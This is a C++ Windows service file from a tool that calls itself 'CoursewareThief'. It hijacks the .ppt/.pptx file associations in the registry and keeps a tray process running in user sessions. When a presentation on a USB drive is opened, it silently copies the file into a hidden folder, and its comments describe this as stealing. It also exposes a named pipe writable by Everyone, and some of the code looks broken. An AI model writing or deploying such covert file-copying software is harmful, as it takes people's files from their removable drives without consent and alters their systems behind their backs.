#include <Windows.h>
#include "../../resource/tool.h"
#include "service.h"
#include <unordered_set>
#include <accctrl.h>
#include <aclapi.h>
#include "resource.h"
using namespace std;



extern HINSTANCE hInst;


wstring szSvcName;



static DWORD WINAPI UserTrayProcessWatchdog(PVOID psessionid) {
	DWORD sessionid = (DWORD)(LONG_PTR)psessionid;
	HANDLE hToken = NULL;
	STARTUPINFO si{}; PROCESS_INFORMATION pi{};
	WCHAR szCmdLine[1024]{};
	while (1) {
		//检测用户是否还在登录（通过Token）
		if (!WTSQueryUserToken(sessionid, &hToken)) {
			if (hToken) CloseHandle(hToken);
			break; // 用户注销, etc.
		}
		if (hToken) CloseHandle(hToken);

		wcscpy_s(szCmdLine, (L"cwtui.exe --type=tray --service-name=\"" +
			szSvcName + L"\"").c_str());
		if (!Process.StartAsActiveUserT(L"cwtui.exe", szCmdLine, 0, 0,
			FALSE, 0, 0, 0, &si, &pi)) {
			// 进程创建失败
			return GetLastError();
		}
		CloseHandle(pi.hThread);
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		Sleep(1000);
	}

	return 0;
}



static DWORD WINAPI UserSessionIdWatcher(PVOID) {
	std::unordered_set<DWORD> createdIds;

	while (true) {
		DWORD dwSessionID = WTSGetActiveConsoleSessionId();
		if (dwSessionID != 0) {
			if (!createdIds.contains(dwSessionID)) {
				HANDLE hThread = CreateThread(0, 0, UserTrayProcessWatchdog,
					(PVOID)(LONG_PTR)dwSessionID, 0, 0);
				if (hThread) {
					CloseHandle(hThread);
					createdIds.insert(dwSessionID);
				}
			}
		}
		Sleep(10000);
	}

	return 0;
}



static DWORD WINAPI FileAssocChanger(PVOID) {

	HKEY hk = NULL;
	wstring originalOpenType;

	if (!file_exists("PPTX.exe"))
	if (!FreeResFile(IDR_BIN_PPTXOPENER, L"BIN", L"PPTX.exe"))
		return GetLastError();
	wstring cmd = L"\"" + GetProgramPathW() + L"PPTX.exe\" \"%1\"";

	RegOpenKeyExW(HKEY_CLASSES_ROOT, L".pptx", 0, KEY_READ | KEY_WRITE, &hk);
	if (!hk) return -1;
	MyQueryRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
	if (originalOpenType.empty()) {
		MyQueryRegistryValue(hk, L"", L"", originalOpenType);
		MySetRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
		MySetRegistryValue(hk, L"", L"", L"CoursewareThief.PPTX");
	}
	RegCloseKey(hk);

	RegOpenKeyExW(HKEY_CLASSES_ROOT, L".ppt", 0, KEY_READ | KEY_WRITE, &hk);
	if (!hk) return -1;
	MyQueryRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
	if (originalOpenType.empty()) {
		MyQueryRegistryValue(hk, L"", L"", originalOpenType);
		MySetRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
		MySetRegistryValue(hk, L"", L"", L"CoursewareThief.PPTX");
	}
	RegCloseKey(hk);

	RegOpenKeyExW(HKEY_CLASSES_ROOT, L"CoursewareThief.PPTX\\"
		L"shell\\open\\command", 0,
		KEY_READ | KEY_WRITE, &hk);
	if (!hk) {
		RegCreateKeyExW(HKEY_CLASSES_ROOT, L"CoursewareThief.PPTX\\"
			L"shell\\open\\command", 0, NULL, 0,
			KEY_READ | KEY_WRITE, NULL, &hk, NULL);
		if (hk) RegCloseKey(hk);
		bool result = MySetRegistryValue(HKEY_CLASSES_ROOT, L"CoursewareThief.PPTX\\"
			L"shell\\open\\command", L"", cmd);
		//fstream fp("app.log", ios::app);
		//fp << "result: " << result << endl;
	}
	RegCloseKey(hk);


	return 0;
}


bool ShellOpenCourseware(wstring file, DWORD session) {
	wstring cmdLine = L"cwtshell --type=user-shell-open-file --file=\""
		+ file + L"\"";
	STARTUPINFO si{}; PROCESS_INFORMATION pi{};
	(void)Process.StartAsUserT(session, (GetProgramDirW() + L"\\..\\cwtshell.exe")
		.c_str(), (LPTSTR)cmdLine.c_str(), NULL, NULL, FALSE, 0, 0, 0, &si, &pi);
	if (pi.hThread) CloseHandle(pi.hThread);
	if (pi.hProcess) CloseHandle(pi.hProcess);
	return !!pi.dwProcessId;
}



static bool IsRemovableDrive(const std::wstring& disk) {
	UINT driveType = GetDriveTypeW(disk.c_str());

	// 可移除的磁盘驱动器通常是U盘  
	if (driveType == DRIVE_REMOVABLE) {
		return true;
	}

	return false;
}
static bool OpenCoursewareFromNamedPipe(HANDLE hPipe, wstring cw) {
	if (cw.empty()) return false;

	auto direct = [&] {
		DWORD sessionID = WTSGetActiveConsoleSessionId();
		GetNamedPipeClientSessionId(hPipe, &sessionID);
		return ShellOpenCourseware(cw, sessionID);
	};

	// 判断文件是否在U盘上
	wstring disk = cw[0] + L":\\";
	if (!IsRemovableDrive(disk)) {
		// 直接打开
		return direct();
	}

	// 文件在U盘上
	auto size = MyGetFileSizeW(cw);
	if (size > ULONGLONG(100) * 1024 * 1024) { // 100MB
		// 直接打开
		return direct();
	}
	FILETIME modifyTime{};
	ULARGE_INTEGER nModTime{};
	HANDLE hFile = CreateFileW(cw.c_str(), GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return direct();
	}
	GetFileTime(hFile, NULL, &modifyTime, NULL);
	CloseHandle(hFile);

	nModTime.LowPart = modifyTime.dwLowDateTime;
	nModTime.HighPart = modifyTime.dwHighDateTime;
	wstring targetFolderName = L"@@" + cw + L"." + to_wstring(nModTime.QuadPart) +
		L"-917a77f7";
	wstring targetFile = L"Files\\" + targetFolderName + L"\\" + cw;
	targetFile = GetProgramPathW() + targetFile;
	if (file_exists(L"Files/" + targetFolderName) &&
		file_exists(targetFile)) {
		// 偷过了
		DWORD sessionID = WTSGetActiveConsoleSessionId();
		GetNamedPipeClientSessionId(hPipe, &sessionID);
		return ShellOpenCourseware(targetFile, sessionID);
	}

	// 偷了
	// TODO: 显示偷取进度

	CreateDirectoryW((L"Files/" + targetFolderName).c_str(), NULL);
	CopyFileW(cw.c_str(), targetFile.c_str(), FALSE);
	
	if (file_exists(L"Files/" + targetFolderName) &&
		file_exists(targetFile)) {
		// 打开
		DWORD sessionID = WTSGetActiveConsoleSessionId();
		GetNamedPipeClientSessionId(hPipe, &sessionID);
		return ShellOpenCourseware(targetFile, sessionID);
	}
	else return direct();

	return true;
}



// Function to handle a client connection  
static void __stdcall OpenerPipe_ClientHandler(void* pParam) {
	HANDLE hPipe = (HANDLE)pParam;
	WCHAR buffer[2048]{};
	DWORD bytesRead = 0;
	BOOL result = ReadFile(hPipe, buffer, sizeof(buffer) - 2, &bytesRead, NULL);
	if (result && bytesRead > 0) {
		// use buffer
#if 0
		wchar_t title[] = L"server"; DWORD resp = 0;
		WTSSendMessageW(WTS_CURRENT_SERVER, WTSGetActiveConsoleSessionId(),
			title, 12, buffer, bytesRead, MB_ICONINFORMATION, 0, &resp, 0);
		CopyFileExW;
#endif
		;

		wstring str;
		str = OpenCoursewareFromNamedPipe(hPipe, buffer) ?
			L"success" : to_wstring(GetLastError());

		// Send the data back to the client  
		DWORD bytesWritten;
		WriteFile(hPipe, str.c_str(), DWORD((str.length() + 1) * 2), &bytesWritten, NULL);
	}
	else {
		/*std::cerr << "ReadFile failed with error: "
			<< GetLastError() << std::endl;*/
	}

	DisconnectNamedPipe(hPipe);
	CloseHandle(hPipe);
	_endthread();
	return;
}
static DWORD WINAPI GlobalOpenerPipe(PVOID) {
	WCHAR pipeName[256]{};
	if (!LoadStringW(hInst, IDS_STRING_SERVICE_NAMEDPIPE_NAME,
		pipeName, 256)) return GetLastError();
	HANDLE hPipe;
	SECURITY_ATTRIBUTES sa{ 0 };
	SECURITY_DESCRIPTOR sd{ 0 };
	{
		SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
		PSID pSid = NULL;
		AllocateAndInitializeSid(&sia, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid); // Everyone
		BYTE buf[0x400] = { 0 };
		PACL pAcl = (PACL)&buf;
		InitializeAcl(pAcl, 1024, ACL_REVISION);
		AddAccessAllowedAce(pAcl, ACL_REVISION,
			GENERIC_READ | GENERIC_WRITE | READ_CONTROL, pSid);
		InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
		SetSecurityDescriptorDacl(&sd, TRUE, (PACL)pAcl, FALSE);
		sa.nLength = (DWORD)sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = (LPVOID)&sd;
		sa.bInheritHandle = TRUE;
		FreeSid(pSid);
	}

	while (true) { // Loop to accept multiple connections  
		hPipe = CreateNamedPipeW(
			pipeName,
			PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
			PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
			64,
			1024, 1024, 0, &sa
		);

		if (hPipe == INVALID_HANDLE_VALUE || !hPipe) {
			DWORD err = GetLastError();
			fstream fp("error.log", ios::app);
			fp << "[" << time(0) << "] " << "CreateNamedPipe "
				"failed with error: " << err << "while pipe name is: " <<
				ws2s(pipeName) << std::endl;
			fp.close();
			Sleep(1000); // Wait for a second and retry
			continue;
		}


		ConnectNamedPipe(hPipe, NULL);
		//std::cout << "Client connected to the named pipe." << std::endl;

		// Start a new thread to handle the client  
		unsigned threadID = 0;
		_beginthread(OpenerPipe_ClientHandler, 0, (void*)hPipe);
	}

	return 0;
}


constexpr LPTHREAD_START_ROUTINE workerThreads[] = {
	UserSessionIdWatcher,
	GlobalOpenerPipe,
	FileAssocChanger,
};
constexpr size_t workerThreadsCount =
	sizeof(workerThreads) / sizeof(LPTHREAD_START_ROUTINE);
HANDLE hServiceWorkerThreads[min(32, workerThreadsCount)] = {};
#define checkFile(x) \
	if (file_exists(x)) DeleteFileW(x); \
	CopyFileW(GetProgramDirW().c_str(), x, FALSE);
DWORD WINAPI srv_main(PVOID) {
	checkFile(L"cwtui.exe");
	checkFile(L"cwtshell.exe");

	if (IsFileOrDirectory(L"Files") != -1) {
		if (IsFileOrDirectory(L"Files") == 1) RemoveDirectoryW(L"Files");
		CreateDirectoryW(L"Files", NULL);
		SetFileAttributesW(L"Files", FILE_ATTRIBUTE_HIDDEN);
	}

	AutoZeroMemory(hServiceWorkerThreads);

	for (size_t i = 0; i < workerThreadsCount; ++i) {
		hServiceWorkerThreads[i] =
			CreateThread(0, 0, workerThreads[i], 0, 0, 0);
		if (!hServiceWorkerThreads[i]) {
			return GetLastError();
		}
	}


	WaitForMultipleObjects(workerThreadsCount,
		hServiceWorkerThreads, TRUE, INFINITE);
	for (size_t i = 0; i < workerThreadsCount; ++i)
		if (hServiceWorkerThreads[i]) CloseHandle(hServiceWorkerThreads[i]);

	return 0;
}


